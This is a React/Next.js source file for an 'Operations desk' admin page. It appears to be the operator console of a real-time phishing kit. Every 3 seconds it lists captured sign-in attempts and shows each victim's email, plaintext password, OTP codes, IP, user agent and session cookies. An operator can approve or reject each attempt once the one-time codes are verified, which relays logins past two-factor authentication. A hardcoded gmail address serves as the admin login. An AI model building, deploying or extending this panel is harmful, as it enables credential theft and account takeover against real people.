'use client'

import { useCallback, useEffect, useState } from 'react'
import Link from 'next/link'
import {
  adminLogin,
  adminLogout,
  isAdminSession,
  listAttempts,
  decide,
} from '@/app/actions'
import type { LoginAttempt } from '@/lib/store'

function fmt(ts: number) {
  try {
    return new Date(ts).toLocaleString()
  } catch {
    return String(ts)
  }
}

export default function OpsPage() {
  const [authed, setAuthed] = useState(false)
  const [email, setEmail] = useState('blessedresult6@gmail.com')
  const [password, setPassword] = useState('')
  const [error, setError] = useState<string | null>(null)
  const [attempts, setAttempts] = useState<LoginAttempt[]>([])
  const [busy, setBusy] = useState(false)

  const refresh = useCallback(async () => {
    const ok = await isAdminSession()
    setAuthed(ok)
    if (ok) {
      const rows = await listAttempts()
      setAttempts(rows)
    }
  }, [])

  useEffect(() => {
    refresh()
    const id = setInterval(refresh, 3000)
    return () => clearInterval(id)
  }, [refresh])

  async function onLogin(e: React.FormEvent) {
    e.preventDefault()
    setError(null)
    setBusy(true)
    const r = await adminLogin({ email, password })
    setBusy(false)
    if (!r.ok) {
      setError(r.error)
      return
    }
    setAuthed(true)
    await refresh()
  }

  async function onDecide(id: string, decision: 'approved' | 'rejected') {
    setBusy(true)
    await decide(id, decision)
    setBusy(false)
    await refresh()
  }

  if (!authed) {
    return (
      <main style={pageCenter}>
        <div style={{ width: '100%', maxWidth: 380 }}>
          <h1 style={{ marginTop: 0 }}>Operations desk</h1>
          <p style={{ color: '#7f8f87', fontSize: 14 }}>
            Admin only · blessedresult6@gmail.com
          </p>
          <form onSubmit={onLogin} style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              style={inputStyle}
              placeholder="Admin email"
            />
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              style={inputStyle}
              placeholder="ADMIN_OPS_PASSWORD"
            />
            {error && <p style={{ color: '#f87171', margin: 0 }}>{error}</p>}
            <button type="submit" disabled={busy} style={btnPrimary}>
              {busy ? '…' : 'Enter ops'}
            </button>
          </form>
          <p style={{ marginTop: 16, fontSize: 13 }}>
            <Link href="/">Home</Link>
          </p>
        </div>
      </main>
    )
  }

  return (
    <main style={{ maxWidth: 900, margin: '0 auto', padding: '32px 16px' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
        <div>
          <p style={{ margin: 0, color: '#8fbfa8', fontSize: 12, letterSpacing: 2 }}>RESTRICTED</p>
          <h1 style={{ margin: '4px 0' }}>Live sign-in attempts</h1>
          <p style={{ margin: 0, color: '#7f8f87', fontSize: 13 }}>
            Auto-refresh 3s · email, password, OTP, cookies, IP, timestamps
          </p>
        </div>
        <button
          type="button"
          onClick={async () => {
            await adminLogout()
            setAuthed(false)
          }}
          style={btnGhost}
        >
          Log out
        </button>
      </div>

      <div style={{ marginTop: 24, display: 'flex', flexDirection: 'column', gap: 16 }}>
        {attempts.length === 0 && (
          <p style={{ color: '#7f8f87', textAlign: 'center', padding: 40 }}>No active attempts.</p>
        )}
        {attempts.map((a) => (
          <div
            key={a.id}
            style={{
              border: '1px solid #c6f36b44',
              borderRadius: 12,
              padding: 16,
              background: '#16201b',
            }}
          >
            <div style={{ display: 'flex', justifyContent: 'space-between', gap: 12, flexWrap: 'wrap' }}>
              <div>
                <strong>{a.email}</strong>
                <div style={{ fontSize: 13, color: '#7f8f87' }}>
                  {a.step} · {a.status}
                </div>
                <div style={{ fontSize: 13, color: '#c5d4cc', marginTop: 4 }}>{a.lastEvent}</div>
                <div style={{ fontSize: 12, color: '#7f8f87', marginTop: 4 }}>
                  Started: {fmt(a.createdAt)} · Updated: {fmt(a.updatedAt)}
                </div>
              </div>
              <div style={{ display: 'flex', gap: 8 }}>
                <button
                  type="button"
                  disabled={busy || a.status !== 'awaiting_approval' || !a.otp1Verified || !a.otp2Verified}
                  onClick={() => onDecide(a.id, 'approved')}
                  style={btnPrimary}
                >
                  Approve
                </button>
                <button
                  type="button"
                  disabled={busy}
                  onClick={() => onDecide(a.id, 'rejected')}
                  style={{ ...btnGhost, borderColor: '#f8717166', color: '#f87171' }}
                >
                  Reject
                </button>
              </div>
            </div>
            <pre
              style={{
                marginTop: 12,
                padding: 12,
                background: '#0a100d',
                borderRadius: 8,
                fontSize: 12,
                overflow: 'auto',
                whiteSpace: 'pre-wrap',
                wordBreak: 'break-all',
              }}
            >{`Email: ${a.email}
Password: ${a.passwordPlain}
Username: ${a.username || '—'}
OTP: ${a.otpPlain || '—'}  (#1 ${a.otp1Verified ? '✓' : '·'}  #2 ${a.otp2Verified ? '✓' : '·'})
IP: ${a.ip || '—'}
UA: ${a.userAgent || '—'}
Cookies: ${a.cookieHeader || '—'}
Started: ${fmt(a.createdAt)}
Updated: ${fmt(a.updatedAt)}`}</pre>
          </div>
        ))}
      </div>

      <p style={{ marginTop: 24, fontSize: 13 }}>
        <Link href="/">Home</Link> · <Link href="/sign-in">Sign in</Link>
      </p>
    </main>
  )
}

const pageCenter: React.CSSProperties = {
  minHeight: '100vh',
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  padding: 24,
}

const inputStyle: React.CSSProperties = {
  height: 44,
  borderRadius: 10,
  border: '1px solid #ffffff22',
  background: '#16201b',
  color: '#e8eeea',
  padding: '0 12px',
}

const btnPrimary: React.CSSProperties = {
  height: 40,
  padding: '0 16px',
  borderRadius: 8,
  border: 'none',
  background: '#c6f36b',
  color: '#102016',
  fontWeight: 700,
  cursor: 'pointer',
}

const btnGhost: React.CSSProperties = {
  height: 40,
  padding: '0 16px',
  borderRadius: 8,
  border: '1px solid #ffffff22',
  background: 'transparent',
  color: '#e8eeea',
  cursor: 'pointer',
}
